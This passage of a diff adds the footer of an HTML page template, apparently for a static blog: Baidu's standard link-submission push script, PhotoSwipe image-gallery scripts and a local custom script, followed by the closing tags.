+    var bp = document.createElement('script'); bp.async = true;
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+
+  
+    <script type="text/javascript" src="/js/load-photoswipe.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe.min.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe-ui-default.min.js"></script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/my.js"></script>
+
+
+</body>
+</html>
